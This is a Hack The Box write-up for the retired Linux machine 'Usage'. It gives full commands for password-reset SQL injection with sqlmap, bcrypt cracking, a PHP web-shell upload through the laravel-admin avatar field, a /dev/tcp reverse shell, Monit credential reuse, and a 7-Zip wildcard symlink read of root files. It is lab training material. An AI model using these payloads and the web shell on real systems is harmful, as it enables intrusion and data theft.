---
title: "Hack The Box — Usage"
summary: "Usage chains password-reset SQL injection, bcrypt cracking and a Laravel-admin avatar upload into a shell, then leaks root files through 7-Zip."
platform: "Hack The Box"
contentType: "machine"
publicationPolicy: "retired"
difficulty: "Easy"
os: "Linux"
solvedAt: 2026-11-28
publishedAt: 2026-11-28
tags:
  - sql-injection
  - password-cracking
  - file-upload
  - laravel-admin
  - credential-reuse
  - wildcard-abuse
  - privilege-escalation
tools:
  - Nmap
  - Burp Suite
  - sqlmap
  - Hashcat
  - curl
  - Netcat
  - 7-Zip
cves:
  - CVE-2023-24249
htbUrl: "https://app.hackthebox.com/machines/Usage"
cover: "/images/writeups/hackthebox/machines/usage/cover.png"
coverAlt: "Usage machine logo showing a green circular gauge labeled USAGEMETER"
featured: false
draft: false
---

> This write-up documents an authorized Hack The Box lab. [Usage is listed as a retired machine](https://taktak.hu/case-studies/htb/machines/linux/usage/), and [Hack The Box permits public solutions for retired content](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines). Flag values, VPN addresses, session cookies, CSRF tokens and private keys are omitted. Reproduce the steps only against your own HTB instance.

## Executive summary

The password-reset form accepts an email value that reaches a MySQL query unsafely. A time-based SQL injection extracts a bcrypt hash from `usage_blog.admin_users`, and cracking that hash opens the administrator panel. Its `encore/laravel-admin` 1.8.18 avatar upload accepts a PHP file when the multipart part claims an image MIME type. Code execution lands as `dash`. A hidden Monit configuration exposes a credential reused by `xander`, who can run `usage_management` as root. That binary calls `7za` on a wildcard in a writable directory; an `@listfile` and a symlink turn the backup operation into a root-owned file read.

## Target information

| Item | Value |
| --- | --- |
| Target | Usage |
| Platform | Hack The Box |
| Difficulty | Easy |
| Operating system | Linux |
| Publication policy | [Retired](https://taktak.hu/case-studies/htb/machines/linux/usage/) |
| Solved | 28 November 2026 |
| Main weaknesses | Password-reset SQL injection, unrestricted avatar upload, reused Monit credential, privileged 7-Zip wildcard expansion |

Use the IP assigned to your instance. The address changes between sessions. Get your Kali VPN address from `tun0` before building a reverse-shell payload:

~~~bash
TARGET_IP='<YOUR_HTB_TARGET_IP>'
LHOST=$(ip -4 -o addr show tun0 | awk '{print $4}' | cut -d/ -f1)
printf 'Target: %s\nKali VPN IP: %s\n' "$TARGET_IP" "$LHOST"
printf '%s usage.htb admin.usage.htb\n' "$TARGET_IP" | sudo tee -a /etc/hosts
~~~

## Enumeration

Scan all TCP ports and identify the exposed services:

~~~bash
nmap "$TARGET_IP" -T5 -sVC -p-
~~~

The scan found only SSH and HTTP:

~~~text
22/tcp open  ssh   OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
80/tcp open  http  nginx 1.18.0
http-title: Did not follow redirect to http://usage.htb/
~~~

The hostname redirect is the immediate lead. Browsing `http://usage.htb/` shows a login page with **Login**, **Register**, **Admin** and **Reset Password** links. Registering and signing in reaches a dashboard of blog posts, but does not expose an obvious route to a shell. The **Admin** link goes to the separate virtual host `admin.usage.htb`.

### Test the password-reset form

Open **Reset Password**, submit a normal email, and capture the POST request in Burp Suite. The form posts to `/forget-password`; note the spelling. A single quote in the email produces a server error, which warrants a controlled SQL injection test. The error alone is a clue, not proof.

A useful Burp request has the shape below. Save a **fresh, complete** request as `reset.req`, including its own cookies and `_token`. Replace only the email value with a normal address before giving it to sqlmap:

~~~http
POST /forget-password HTTP/1.1
Host: usage.htb
Content-Type: application/x-www-form-urlencoded
Cookie: XSRF-TOKEN=<FRESH_VALUE>; laravel_session=<FRESH_VALUE>

_token=<FRESH_TOKEN>&email=test%40example.com
~~~

Remove any stale `Content-Length` header if you edit the body by hand. Leaving `email=%27` in the saved request causes sqlmap to identify it as a tainted parameter and stop in batch mode.

## Initial access

### Extract the administrator hash

Test the `email` parameter and dump only the two needed columns:

~~~bash
sqlmap -r reset.req -p email --batch --level=5 --risk=3 \
  -D usage_blog -T admin_users -C username,password --dump
~~~

On this instance, sqlmap confirmed MySQL and reported an **AND time-based blind** injection in the POST `email` parameter. It also observed eight columns during UNION testing, but a workable UNION extraction was not established. The time-based technique retrieved one administrator row; expect this step to take several minutes.

If the session expires, capture a new request. For a CSRF-token failure, sqlmap can fetch the token from the actual reset page:

~~~bash
sqlmap -r reset.req -p email --batch --level=5 --risk=3 \
  --csrf-token=_token --csrf-url=http://usage.htb/forget-password \
  -D usage_blog -T admin_users -C username,password --dump
~~~

The password begins with `$2y$`, identifying a bcrypt hash. Save the hash returned by **your** instance, then use Hashcat mode 3200:

~~~bash
printf '%s\n' '<BCRYPT_HASH_FROM_SQLMAP>' > admin.hash
hashcat -m 3200 -a 0 admin.hash /usr/share/wordlists/rockyou.txt
hashcat -m 3200 admin.hash --show
~~~

If Kali only has `rockyou.txt.gz`, expand it into the working directory and use that copy. Sign in at `http://admin.usage.htb/` as `admin` with the cracked password. The password itself is omitted here because the cracking step is part of the method.

### Abuse the Laravel-admin avatar upload

The dashboard shows `encore/laravel-admin` version **1.8.18**. GitHub's [CVE-2023-24249 advisory](https://github.com/advisories/GHSA-g857-47pm-3r32) lists versions through 1.8.19 as affected by arbitrary file upload. This concerns the **laravel-admin package**, not the core Laravel framework.

Open **Administrator → Setting** or browse to `http://admin.usage.htb/admin/auth/setting`. Prepare a minimal command-execution probe:

~~~bash
printf '%s\n' '<?php system($_GET["cmd"]); ?>' > shell.php
~~~

Capture the settings form submission in Burp. In the multipart `avatar` part, set the filename to `shell.php`, claim `image/jpeg`, and place the PHP code as the part body:

~~~http
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET["cmd"]); ?>
~~~

Keep the fresh request's `_token`, `_method=PUT`, cookies and boundary intact. If the browser refuses to select a PHP file, select a `.jpg` file and change the multipart filename in Burp. A successful response says `Update succeeded !` and shows the uploaded file under `/uploads/images/`. In this run the path was `/uploads/images/shell.php`.

Check execution before trying a shell:

~~~bash
curl -G --data-urlencode 'cmd=id' \
  'http://admin.usage.htb/uploads/images/shell.php'
~~~

The response returned `uid=1000(dash)`. Start a listener in a second Kali terminal:

~~~bash
nc -lvnp 4444
~~~

Then send the reverse-shell command from the first terminal:

~~~bash
curl -G \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'" \
  'http://admin.usage.htb/uploads/images/shell.php'
~~~

The uploaded PHP file is short-lived. If the URL responds `File not found.`, submit the avatar again and immediately repeat the command. Burp Repeater may return **419 Page Expired** when replaying an old request; refresh the settings page, capture a new POST with fresh cookies and CSRF token, and modify that request instead.

The listener should receive a shell as `dash`. The user flag is at `/home/dash/user.txt`; its value is intentionally omitted.

## Privilege escalation

### Move from dash to xander

List hidden files in `dash`'s home directory and inspect the Monit configuration:

~~~bash
ls -la /home/dash
cat /home/dash/.monitrc
~~~

The configuration contains a plaintext Monit credential. The machine also has a local `xander` account. In this lab, the Monit password is reused for that account. Give the reverse shell a pseudo-terminal before using `su`:

~~~bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
su - xander
~~~

Enter the password found in `.monitrc`. Confirm the new identity and inspect the sudo rule:

~~~bash
id
sudo -l
~~~

The rule allows `xander` to run `/usr/bin/usage_management` as root. Inspect the custom binary and its backup option:

~~~bash
strings /usr/bin/usage_management | grep -E '7z|/var/www/html|backup'
sudo /usr/bin/usage_management
~~~

Option **1** creates a project backup with `7za` after changing to `/var/www/html`. The critical detail is that its command passes a wildcard from that directory to a root-run archiver.

### Turn 7-Zip list-file parsing into a root file read

7-Zip interprets an argument beginning with `@` as a list file. Place a file named `@htbroot` in the directory selected by the wildcard, and a matching symlink named `htbroot` pointing at the root-owned flag:

~~~bash
cd /var/www/html
touch '@htbroot'
ln -s /root/root.txt htbroot
sudo /usr/bin/usage_management
~~~

Choose **1** for backup. When `7za` processes `@htbroot`, it reads through the symlink as root, fails to use the flag text as a list of files, and echoes that text in a `No more files` warning. In this run the warning revealed the root flag. The value is omitted.

This is an **arbitrary root file read**. We reached the root flag through that read; this run did not establish an interactive root shell.

## What did not work

- Saving the single-quote probe as `email=%27` made sqlmap reject the tainted baseline. A normal email in the request let sqlmap generate and validate its own payloads.
- sqlmap's UNION experiments found an eight-column query but did not yield the needed extraction. Its time-based blind result did.
- Replaying an old avatar request returned HTTP **419** because its session or CSRF token had expired. A fresh browser submission supplied both.
- The first reverse-shell attempt received `File not found.` after the upload had been cleaned. Re-uploading and invoking the URL immediately produced the shell.

## Attack path

1. Enumerate ports 22 and 80, then resolve `usage.htb` and `admin.usage.htb`.
2. Capture the password-reset POST and confirm blind SQL injection in `email`.
3. Dump `usage_blog.admin_users`, crack the bcrypt hash, and log in as the site administrator.
4. Upload PHP through the vulnerable laravel-admin avatar field and obtain a shell as `dash`.
5. Read `.monitrc` and reuse its credential to become `xander`.
6. Abuse the root-run `usage_management` backup and 7-Zip `@listfile` handling to read `/root/root.txt`.

## Lessons learned

- Preserve a valid, ordinary baseline request for automated SQL injection testing. CSRF state and cookies matter as much as the payload.
- An image MIME label is not a safe substitute for validating content and extension before storing an upload in a web-executable location.
- Service credentials stored in a user's home directory can become local login credentials when passwords are reused.
- A privileged program should never pass attacker-controlled wildcard expansions to an archiver. Here, 7-Zip's list-file syntax crossed a root trust boundary and exposed a root-only file.

## References

- [Hack The Box publication guidelines](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines)
- [Usage retired-machine listing](https://taktak.hu/case-studies/htb/machines/linux/usage/)
- [sqlmap usage and anti-CSRF options](https://github.com/sqlmapproject/sqlmap/wiki/usage)
- [GitHub advisory for CVE-2023-24249](https://github.com/advisories/GHSA-g857-47pm-3r32)
- [IppSec's Usage walkthrough](https://www.youtube.com/watch?v=cx9Da-PoXG4)
